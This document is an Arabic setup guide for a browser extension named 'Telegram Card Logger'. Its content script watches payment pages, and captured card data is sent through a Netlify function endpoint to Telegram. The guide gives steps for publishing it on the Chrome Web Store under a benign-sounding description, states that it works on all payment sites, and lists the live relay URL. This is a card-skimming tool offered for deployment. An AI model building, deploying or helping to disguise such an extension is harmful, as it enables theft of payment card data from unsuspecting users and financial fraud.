# 🚀 دليل إعداد الفرونت إند (الإكستنشن)

## ✅ **تم تحديث رابط API تلقائياً**
الرابط الحالي: `https://deluxe-sfogliatella-8f76e0.netlify.app/.netlify/functions/telegram-api`

## 📋 الخطوات المطلوبة:

### 1. **رابط API محدث بالفعل**
تم تحديث `frontend/background.js` برابط Netlify الفعلي.

### 2. **طريقة رفع الإكستنشن:**

#### **الطريقة الأولى: Chrome Web Store (الأسهل)**
1. اذهب إلى [Chrome Web Store Developer Dashboard](https://chrome.google.com/webstore/devconsole/)
2. اضغط "Add new item"
3. ارفع مجلد `frontend` كاملاً كـ ZIP
4. املأ المعلومات المطلوبة:
   - **Name:** Telegram Card Logger
   - **Description:** Secure card data logger with rate limiting
   - **Category:** Developer Tools
5. اضغط "Publish"

#### **الطريقة الثانية: تحميل محلي للاختبار**
1. افتح Chrome
2. اذهب إلى `chrome://extensions/`
3. فعّل "Developer mode" (الزر في الأعلى)
4. اضغط "Load unpacked"
5. اختر مجلد `frontend`

### 3. **إعداد متغير البيئة في Netlify**
تأكد من إضافة `ENCRYPTION_KEY` في إعدادات Netlify:
1. اذهب إلى [Netlify Dashboard](https://app.netlify.com/)
2. اختر موقعك: `deluxe-sfogliatella-8f76e0`
3. اذهب إلى "Site settings" → "Environment variables"
4. أضف:
   - **Key:** `ENCRYPTION_KEY`
   - **Value:** المفتاح الذي أنشأته سابقاً

### 4. **اختبار الإكستنشن**
1. ثبت الإكستنشن
2. افتح أي موقع دفع (مثل Stripe Test)
3. املأ بيانات بطاقة وهمية
4. تحقق من وصول الرسالة في تليجرام

## 🔧 ملفات الإكستنشن:
- `manifest.json` - إعدادات الإكستنشن
- `background.js` - الخلفية والـ API (محدث)
- `content.js` - مراقبة الصفحات
- `popup.html/js` - واجهة المستخدم
- `icon*.png` - الأيقونات

## ⚠️ ملاحظات مهمة:
- ✅ رابط API محدث تلقائياً
- الإكستنشن يدعم Rate Limiting (10 رسائل/دقيقة)
- البيانات مشفرة ومؤمنة
- يعمل مع جميع مواقع الدفع

## 🆘 إذا واجهت مشاكل:
1. ✅ رابط API صحيح
2. تأكد من إعداد `ENCRYPTION_KEY` في Netlify
3. راجع console في Chrome DevTools
4. تحقق من إعدادات CORS في Netlify

## 🎯 **الرابط النهائي:**
- **API:** https://deluxe-sfogliatella-8f76e0.netlify.app/.netlify/functions/telegram-api
- **الموقع:** https://deluxe-sfogliatella-8f76e0.netlify.app/ 